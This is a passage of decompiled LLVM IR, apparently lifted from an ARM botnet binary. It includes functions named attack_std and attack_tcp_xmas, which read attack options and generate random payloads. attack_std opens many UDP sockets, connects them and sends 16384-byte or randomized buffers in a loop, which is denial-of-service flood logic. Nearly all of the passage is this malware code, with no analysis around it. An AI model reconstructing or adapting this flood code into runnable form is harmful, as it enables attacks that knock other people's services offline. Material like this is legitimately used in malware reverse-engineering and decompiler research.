  %v9_95a4 = icmp eq i32 %v0_95a4, 65535
  store i1 %v9_95a4, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = load i32, i32* @r5, align 4
  %v2_95a8 = add i32 %v1_95a8, 12
  %v3_95a8 = inttoptr i32 %v2_95a8 to i32*
  store i32 %v0_9598, i32* %v3_95a8, align 4
  br i1 %v9_95a4, label %dec_label_pc_95b0, label %dec_label_pc_9598.dec_label_pc_9454_crit_edge

dec_label_pc_9598.dec_label_pc_9454_crit_edge:    ; preds = %dec_label_pc_9598
  %v1_9458.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9454

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9444
  %v0_95b0 = call i32 @rand_next()
  %v3_95b8 = urem i32 %v0_95b0, 65536
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v1_95c4 = sub nsw i32 999, %v3_95b8
  store i32 %v1_95c4, i32* %r3.global-to-local, align 4
  %v1_95c8 = load i32, i32* %r4.global-to-local, align 4
  %v9_95c8 = icmp eq i32 %v3_91dc, %v1_95c8
  store i1 %v9_95c8, i1* %cpsr_z.global-to-local, align 1
  %v1_95cc = trunc i32 %v0_95b0 to i16
  %v2_95cc = load i32, i32* @r5, align 4
  %v3_95cc = add i32 %v2_95cc, 4
  %v4_95cc = inttoptr i32 %v3_95cc to i16*
  store i16 %v1_95cc, i16* %v4_95cc, align 2
  %v0_95d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i16
  %v2_95d0 = load i32, i32* @r6, align 4
  %v3_95d0 = add i32 %v2_95d0, 4
  %v4_95d0 = inttoptr i32 %v3_95d0 to i16*
  store i16 %v1_95d0, i16* %v4_95d0, align 2
  br i1 %v9_95c8, label %dec_label_pc_95d8, label %dec_label_pc_95b0.dec_label_pc_9460_crit_edge

dec_label_pc_95b0.dec_label_pc_9460_crit_edge:    ; preds = %dec_label_pc_95b0
  %v1_9464.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9460

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95b0, %dec_label_pc_9454
  %v0_95d8 = call i32 @rand_next()
  %v1_95d8 = trunc i32 %v0_95d8 to i16
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v1_95e0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95e0 = icmp eq i32 %v3_91e0, %v1_95e0
  store i1 %v9_95e0, i1* %cpsr_z.global-to-local, align 1
  %v3_95e4 = load i32, i32* @r5, align 4
  %v4_95e4 = add i32 %v3_95e4, 44
  %v5_95e4 = inttoptr i32 %v4_95e4 to i16*
  store i16 %v1_95d8, i16* %v5_95e4, align 2
  br i1 %v9_95e0, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  %v0_95ec = call i32 @rand_next()
  %v1_95ec = trunc i32 %v0_95ec to i16
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_95ec
  %v3_95fc31 = load i32, i32* @r7, align 4
  %v4_95fc32 = add i32 %v3_95fc31, 2
  %v5_95fc33 = inttoptr i32 %v4_95fc32 to i16*
  store i16 %v1_95ec, i16* %v5_95fc33, align 2
  br label %dec_label_pc_9608

bb85:                                             ; preds = %dec_label_pc_95ec
  %v1_95f8 = load i32, i32* @r5, align 4
  %v2_95f8 = add i32 %v1_95f8, 16
  %v3_95f8 = inttoptr i32 %v2_95f8 to i32*
  %v4_95f8 = load i32, i32* %v3_95f8, align 4
  store i32 %v4_95f8, i32* %r3.global-to-local, align 4
  %v3_95fc = load i32, i32* @r7, align 4
  %v4_95fc = add i32 %v3_95fc, 2
  %v5_95fc = inttoptr i32 %v4_95fc to i16*
  store i16 %v1_95ec, i16* %v5_95fc, align 2
  %v1_9600 = load i32, i32* %r3.global-to-local, align 4
  %v2_9600 = load i32, i32* @r6, align 4
  %v3_9600 = add i32 %v2_9600, 16
  %v4_9600 = inttoptr i32 %v3_9600 to i32*
  store i32 %v1_9600, i32* %v4_9600, align 4
  br label %dec_label_pc_9480

dec_label_pc_9608:                                ; preds = %.thread30, %dec_label_pc_946c
  %v0_9608 = call i32 @rand_next()
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  %v1_9614 = load i32, i32* @r6, align 4
  %v2_9614 = add i32 %v1_9614, 16
  %v3_9614 = inttoptr i32 %v2_9614 to i32*
  store i32 %v0_9608, i32* %v3_9614, align 4
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_961c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608
  %v0_961c = load i32, i32* @r7, align 4
  %v1_961c = add i32 %v0_961c, 8
  store i32 %v6_9128, i32* %r1.global-to-local, align 4
  %v2_9624 = inttoptr i32 %v1_961c to i16*
  %v3_9624 = call i32 @rand_str(i16* %v2_9624, i32 %v6_9128)
  br label %dec_label_pc_948c

dec_label_pc_962c:                                ; preds = %dec_label_pc_91a0
  %v1_9630 = call i32 @__GI___libc_close(i32 %v3_9190)
  br label %dec_label_pc_9634

dec_label_pc_9634:                                ; preds = %entry, %dec_label_pc_962c
  %v1_963c = phi i32 [ %v3_9190, %entry ], [ %v1_9630, %dec_label_pc_962c ]
  store i32 %v3_9040, i32* %r4.global-to-local, align 4
  store i32 %v6_9040, i32* %r5.global-to-local, align 4
  store i32 %v24_9040, i32* %fp.global-to-local, align 4
  ret i32 %v1_963c

dec_label_pc_9640:                                ; preds = %dec_label_pc_91c8
  store i32 %v6_9128, i32* %r2.global-to-local, align 4
  %v1_9648 = add i32 %v6_9128, 8
  store i32 %v1_9648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93fc.preheader

; uselistorder directives
  uselistorder i32 %v1_9648, { 1, 0 }
  uselistorder i16 %v1_95ec, { 1, 0 }
  uselistorder i32 %v0_95b0, { 1, 0 }
  uselistorder i32 %v5_9588, { 1, 0 }
  uselistorder i32 %v0_954c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9528, { 1, 2, 0 }
  uselistorder i32 %v1_9524, { 2, 0, 3, 1 }
  uselistorder i32 %v3_94d8, { 1, 0, 2 }
  uselistorder i32 %v0_94c0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9424, { 1, 0, 2 }
  uselistorder i1 %v7_943c, { 2, 1, 0 }
  uselistorder i1 %v2_9610, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95f4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9398, { 1, 0 }
  uselistorder i32 %v4_930c13, { 1, 0 }
  uselistorder i32 %v3_9230, { 1, 0 }
  uselistorder i32 %v3_9214, { 1, 2, 0 }
  uselistorder i32 %v1_9210, { 1, 0 }
  uselistorder i32 %v1_91d4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_91d0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_91cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_91c8, { 1, 0, 2, 3 }
  uselistorder i1 %v7_91c0, { 1, 0 }
  uselistorder i1 %v7_9194, { 1, 0 }
  uselistorder i32 %v3_9190, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_917c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9148, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9128, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_90dc, { 1, 2, 0 }
  uselistorder i32 %v1_90b8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_90b0, { 1, 0 }
  uselistorder i32 %v6_9074, { 2, 1, 3, 0 }
  uselistorder i32 %v2_905c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 6, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_961c, { 1, 0 }
  uselistorder label %dec_label_pc_948c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93fc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_965c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9678 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_9678, i32* @sl, align 4
  %v0_9684 = load i32, i32* @r7, align 4
  %v2_9688 = call i32 @calloc(i32 %v0_9684, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_9694 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_9688, i32* @r8, align 4
  %v0_96a4 = load i32, i32* @r5, align 4
  %v5_96a8 = inttoptr i32 %v0_9694 to i32*
  %v6_96a8 = call i32 @attack_get_opt_int(i32 %v0_96a4, i32* %v5_96a8, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_96b0 = urem i32 %v6_96a8, 65536
  %v0_96b4 = load i32, i32* @r6, align 4
  %v0_96bc = load i32, i32* @r4, align 4
  store i32 %v0_96bc, i32* %r3.global-to-local, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %v5_96c8 = inttoptr i32 %v0_96b4 to i32*
  %v6_96c8 = call i32 @attack_get_opt_int(i32 %v0_96c0, i32* %v5_96c8, i32 6, i32 %v0_96bc, i32 %v3_96b0)
  %v0_96cc = load i32, i32* @r6, align 4
  %v3_96d0 = mul i32 %v6_96c8, 65536
  store i32 %v3_96d0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v5_96e0 = inttoptr i32 %v0_96cc to i32*
  %v6_96e0 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r6, align 4
  %v0_96f4 = load i32, i32* @r5, align 4
  %v3_96f8 = urem i32 %v6_96e0, 65536
  store i32 %v3_96f8, i32* @r5, align 4
  %v5_96fc = inttoptr i32 %v0_96f0 to i32*
  %v6_96fc = call i32 @attack_get_opt_int(i32 %v0_96f4, i32* %v5_96fc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_9700 = load i32, i32* %sb.global-to-local, align 4
  %v3_9700 = udiv i32 %v0_9700, 65536
  store i32 %v3_9700, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9708 = load i32, i32* @r4, align 4
  %v9_9708 = icmp eq i32 %v3_9700, %v1_9708
  br i1 %v9_9708, label %dec_label_pc_9738, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_9720 = udiv i32 %v0_9700, 16777216
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9748

dec_label_pc_9738:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_9738 = call i32 @rand_next()
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %bb, %dec_label_pc_9738
  %v0_972c10 = urem i32 %v6_96fc, 256
  %v0_9748 = load i32, i32* @r7, align 4
  %v2_9748 = icmp eq i32 %v0_9748, 0
  br i1 %v2_9748, label %dec_label_pc_9888, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9748
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97fc = udiv i32 %v3_96b0, 256
  %v1_97f8 = mul i32 %v6_96a8, 256
  %v4_9800 = and i32 %v1_97f8, 65280
  %v5_9800 = or i32 %v4_9800, %v3_97fc
  %v2_9780 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97e0

dec_label_pc_9760:                                ; preds = %bb51, %dec_label_pc_9820
  %v3_976c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_9774 = icmp eq i32 %v3_976c, -1
  %v0_9778 = load i32, i32* @sb, align 4
  %v1_9778 = add i32 %v0_9778, 1
  store i32 %v1_9778, i32* @sb, align 4
  %v0_977c = load i32, i32* @fp, align 4
  %v1_977c = add i32 %v0_977c, 24
  store i32 %v1_977c, i32* @fp, align 4
  %v2_9788 = load i32, i32* @r8, align 4
  %v3_9788 = add i32 %v2_9788, %stack_var_-60.0
  %v4_9788 = inttoptr i32 %v3_9788 to i32*
  store i32 %v3_976c, i32* %v4_9788, align 4
  br i1 %v7_9774, label %dec_label_pc_987c, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_9760
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_97a8 = call i32 @bind(i32 %v3_976c, i32 %v2_9780, i32 16)
  %v0_97ac = load i32, i32* @r6, align 4
  %v1_97ac = add i32 %v0_97ac, 20
  %v2_97ac = inttoptr i32 %v1_97ac to i8*
  %v3_97ac = load i8, i8* %v2_97ac, align 1
  %v4_97ac = zext i8 %v3_97ac to i32
  store i32 %v4_97ac, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_97ac, 32
  br i1 %tmp, label %dec_label_pc_9834, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790, %dec_label_pc_9834
  %v0_97bc = phi i32 [ %v0_97ac, %dec_label_pc_9790 ], [ %v0_97bc.pre, %dec_label_pc_9834 ]
  %v1_97c0 = load i32, i32* @r8, align 4
  %v2_97c0 = add i32 %v1_97c0, %stack_var_-60.0
  %v3_97c0 = inttoptr i32 %v2_97c0 to i32*
  %v4_97c0 = load i32, i32* %v3_97c0, align 4
  %v3_97c8 = call i32 @__libc_connect(i32 %v4_97c0, i32 %v0_97bc, i32 16)
  %v0_97d0 = load i32, i32* @sb, align 4
  %v1_97d0 = load i32, i32* @r7, align 4
  %v9_97d0 = icmp eq i32 %v0_97d0, %v1_97d0
  %v1_97d4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  br i1 %v9_97d0, label %dec_label_pc_9888, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9750
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9750 ], [ %v1_97d4, %dec_label_pc_97b8 ]
  store i32 65535, i32* @r4, align 4
  %v2_97f0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_9800, i32* %r3.global-to-local, align 4
  %v1_980c = load i32, i32* @r4, align 4
  %v9_980c = icmp eq i32 %v3_96b0, %v1_980c
  %v1_9810 = load i32, i32* @fp, align 4
  %v2_9810 = add i32 %v1_9810, %arg2
  store i32 %v2_9810, i32* @r6, align 4
  %v2_9814 = load i32, i32* @sl, align 4
  %v3_9814 = add i32 %v2_9814, %stack_var_-60.0
  %v4_9814 = inttoptr i32 %v3_9814 to i32*
  store i32 %v2_97f0, i32* %v4_9814, align 4
  br i1 %v9_980c, label %dec_label_pc_9820, label %bb51

bb51:                                             ; preds = %dec_label_pc_97e0
  %v1_9818 = load i32, i32* %r3.global-to-local, align 4
  %v2_9818 = trunc i32 %v1_9818 to i16
  %v3_9818 = load i32, i32* @r6, align 4
  %v4_9818 = add i32 %v3_9818, 2
  %v5_9818 = inttoptr i32 %v4_9818 to i16*
  store i16 %v2_9818, i16* %v5_9818, align 2
  br label %dec_label_pc_9760

dec_label_pc_9820:                                ; preds = %dec_label_pc_97e0
  %v0_9820 = call i32 @rand_next()
  %v1_9820 = trunc i32 %v0_9820 to i16
  %v0_9828 = load i32, i32* @fp, align 4
  %v2_9828 = add i32 %v0_9828, %arg2
  store i32 %v2_9828, i32* @r6, align 4
  %v4_982c = add i32 %v2_9828, 2
  %v5_982c = inttoptr i32 %v4_982c to i16*
  store i16 %v1_9820, i16* %v5_982c, align 2
  br label %dec_label_pc_9760

dec_label_pc_9834:                                ; preds = %dec_label_pc_9790
  %v1_9834 = add i32 %v0_97ac, 16
  %v2_9834 = inttoptr i32 %v1_9834 to i32*
  %v3_9834 = load i32, i32* %v2_9834, align 4
  store i32 %v3_9834, i32* @r4, align 4
  %v0_9838 = call i32 @rand_next()
  %v0_983c = load i32, i32* @r4, align 4
  %v1_9848 = and i32 %v0_983c, 65280
  store i32 %v1_9848, i32* %r3.global-to-local, align 4
  %v0_9850 = load i32, i32* @r6, align 4
  %v1_9850 = add i32 %v0_9850, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  %v5_9854 = call i32 @llvm.bswap.i32(i32 %v0_983c)
  %v7_9858 = lshr i32 %v0_9838, %v4_9850
  %v8_9858 = add i32 %v7_9858, %v5_9854
  %v5_9870 = call i32 @llvm.bswap.i32(i32 %v8_9858)
  store i32 %v5_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = add i32 %v0_9850, 4
  %v3_9874 = inttoptr i32 %v2_9874 to i32*
  store i32 %v5_9870, i32* %v3_9874, align 4
  %v0_97bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_97b8

dec_label_pc_987c:                                ; preds = %dec_label_pc_9760
  store i32 %v18_965c, i32* %sb.global-to-local, align 4
  ret i32 %v3_976c

dec_label_pc_9888:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9748
  %v1_98c822 = phi i32 [ 0, %dec_label_pc_9748 ], [ %v0_97d0, %dec_label_pc_97b8 ]
  %v2_988c = icmp eq i32 %v0_972c10, 0
  br i1 %v2_988c, label %dec_label_pc_98ac.outer, label %dec_label_pc_98c4

dec_label_pc_989c:                                ; preds = %dec_label_pc_98ac
  store i32 %v1_98a0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_989c = load i32, i32* @r8, align 4
  %v4_989c = mul i32 %v1_98a0, 4
  %v5_989c = add i32 %v0_989c, %v4_989c
  %v6_989c = inttoptr i32 %v5_989c to i32*
  %v7_989c = load i32, i32* %v6_989c, align 4
  %v0_98a0 = load i32, i32* @sl, align 4
  %v5_98a0 = add i32 %v0_98a0, %v4_989c
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v4_98a4 = call i32 @__libc_send(i32 %v7_989c, i32 %v7_98a0, i32 %v0_98b0, i32 16384)
  %v0_98a8 = load i32, i32* @r4, align 4
  %v1_98a8 = add i32 %v0_98a8, 1
  %v0_98ac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98ac.outer

dec_label_pc_98ac.outer:                          ; preds = %dec_label_pc_9888, %dec_label_pc_989c
  %v0_98ac.ph = phi i32 [ %v0_98ac.pre.pre, %dec_label_pc_989c ], [ %v1_98c822, %dec_label_pc_9888 ]
  %v1_98a0.ph = phi i32 [ %v1_98a8, %dec_label_pc_989c ], [ 0, %dec_label_pc_9888 ]
  %v0_98b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_98ac

dec_label_pc_98ac:                                ; preds = %dec_label_pc_98ac.outer, %dec_label_pc_98ac
  %v1_98a0 = phi i32 [ 0, %dec_label_pc_98ac ], [ %v1_98a0.ph, %dec_label_pc_98ac.outer ]
  %v8_98b8 = icmp sgt i32 %v0_98ac.ph, %v1_98a0
  br i1 %v8_98b8, label %dec_label_pc_989c, label %dec_label_pc_98ac

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98c8, %dec_label_pc_9888
  %v1_98c821 = phi i32 [ %v1_98c822, %dec_label_pc_9888 ], [ %v1_98c8, %dec_label_pc_98c8 ]
  br label %dec_label_pc_98c8

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_98c4
  %v1_98c8 = phi i32 [ %v1_98c821, %dec_label_pc_98c4 ], [ %v1_98c8.pre, %dec_label_pc_98d4 ]
  %v1_98d4 = phi i32 [ 0, %dec_label_pc_98c4 ], [ %v1_98f4, %dec_label_pc_98d4 ]
  store i32 %v1_98d4, i32* @r6, align 4
  %v6_98d0 = icmp slt i32 %v1_98d4, %v1_98c8
  br i1 %v6_98d0, label %dec_label_pc_98d4, label %dec_label_pc_98c4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98c8
  %v0_98cc = load i32, i32* @r5, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  %v4_98d4 = mul i32 %v1_98d4, 4
  %v5_98d4 = add i32 %v0_98d4, %v4_98d4
  %v6_98d4 = inttoptr i32 %v5_98d4 to i32*
  %v7_98d4 = load i32, i32* %v6_98d4, align 4
  store i32 %v7_98d4, i32* @r4, align 4
  %v2_98dc = inttoptr i32 %v7_98d4 to i16*
  %v3_98dc = call i32 @rand_str(i16* %v2_98dc, i32 %v0_98cc)
  %v0_98e0 = load i32, i32* @r8, align 4
  %v1_98e0 = load i32, i32* @r6, align 4
  %v4_98e0 = mul i32 %v1_98e0, 4
  %v5_98e0 = add i32 %v4_98e0, %v0_98e0
  %v6_98e0 = inttoptr i32 %v5_98e0 to i32*
  %v7_98e0 = load i32, i32* %v6_98e0, align 4
  %v0_98e4 = load i32, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98f0 = call i32 @__libc_send(i32 %v7_98e0, i32 %v0_98e4, i32 %v0_98e8, i32 16384)
  %v0_98f4 = load i32, i32* @r6, align 4
  %v1_98f4 = add i32 %v0_98f4, 1
  %v1_98c8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98c8

; uselistorder directives
  uselistorder i32 %v1_98c8, { 1, 0 }
  uselistorder i32 %v1_98a0, { 2, 1, 0 }
  uselistorder i32 %v5_9870, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97ac, { 1, 0, 2 }
  uselistorder i32 %v3_976c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_9700, { 1, 0 }
  uselistorder i32 %v3_96b0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_98ac, { 1, 0 }
  uselistorder label %dec_label_pc_98ac.outer, { 1, 0 }
  uselistorder label %dec_label_pc_97b8, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
}

define i32 @attack_tcp_xmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98fc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_9918 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_9924 = load i32, i32* @r6, align 4
  store i32 %v0_9924, i32* %r0.global-to-local, align 4
  %v2_9928 = call i32 @calloc(i32 %v0_9924, i32 4)
  %v0_992c = load i32, i32* @r5, align 4
  store i32 %v0_992c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_993c = load i32, i32* @r4, align 4
  store i32 %v0_993c, i32* %r0.global-to-local, align 4
  %v5_9940 = inttoptr i32 %v0_992c to i32*
  %v6_9940 = call i32 @attack_get_opt_int(i32 %v0_993c, i32* %v5_9940, i32 2, i32 0, i32 %v2_9928)
  %v1_994c = urem i32 %v6_9940, 256
  store i32 %v1_994c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9958 = load i32, i32* @r5, align 4
  store i32 %v0_9958, i32* %r1.global-to-local, align 4
  %v0_995c = load i32, i32* @r4, align 4
  store i32 %v0_995c, i32* %r0.global-to-local, align 4
  %v5_9960 = trunc i32 %v6_9940 to i8
  %v6_9964 = inttoptr i32 %v0_9958 to i32*
  %v7_9964 = call i32 @attack_get_opt_int(i32 %v0_995c, i32* %v6_9964, i32 3, i32 65535, i32 %v6_9940)
  %v0_9968 = load i32, i32* @r5, align 4
  store i32 %v0_9968, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9964, i32* @r7, align 4
  %v0_9978 = load i32, i32* @r4, align 4
  store i32 %v0_9978, i32* %r0.global-to-local, align 4
  %v5_997c = inttoptr i32 %v0_9968 to i32*
  %v6_997c = call i32 @attack_get_opt_int(i32 %v0_9978, i32* %v5_997c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9984 = urem i32 %v6_997c, 256
  store i32 %v1_9984, i32* %ip.global-to-local, align 4
  %v0_9988 = load i32, i32* @r5, align 4
  store i32 %v0_9988, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9994 = load i32, i32* @r4, align 4
  store i32 %v0_9994, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_997c, 16777216
  %v5_999c = sdiv i32 %sext, 16777216
  %v6_999c = inttoptr i32 %v0_9988 to i32*
  %v7_999c = call i32 @attack_get_opt_int(i32 %v0_9994, i32* %v6_999c, i32 5, i32 1, i32 %v5_999c)
  %v1_99a8 = urem i32 %v7_999c, 256
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_99b0 = load i32, i32* @r5, align 4
  store i32 %v0_99b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_99b8 = load i32, i32* @r4, align 4
  store i32 %v0_99b8, i32* %r0.global-to-local, align 4
  %v5_99c0 = inttoptr i32 %v0_99b0 to i32*
  %v6_99c0 = call i32 @attack_get_opt_int(i32 %v0_99b8, i32* %v5_99c0, i32 7, i32 65535, i32 %v1_99a8)
  %v0_99c4 = load i32, i32* @r5, align 4
  store i32 %v0_99c4, i32* %r1.global-to-local, align 4
  %v3_99c8 = mul i32 %v6_99c0, 65536
  store i32 %v3_99c8, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r4, align 4
  store i32 %v0_99d4, i32* %r0.global-to-local, align 4
  %v3_99d8 = urem i32 %v6_99c0, 65536
  store i32 %v3_99d8, i32* @sl, align 4
